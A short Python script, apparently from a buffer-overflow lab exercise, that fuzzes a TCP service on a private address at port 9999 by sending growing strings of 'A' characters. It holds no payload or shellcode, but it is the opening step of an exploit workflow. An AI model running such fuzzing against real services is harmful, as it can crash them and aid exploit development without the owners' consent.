#!/user/bin/python3
import socket

host = "10.0.2.4"
defaultPort = 9999
buffer = ["A"]
counter = 100
while len(buffer) <= 30:
    buffer.append("A" * counter)
    counter = counter + 200

for string in buffer:
    print("Fuzzing with bytes: " + str(len(string)))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect((host, defaultPort))
    s.send(string.encode())
    s.close()

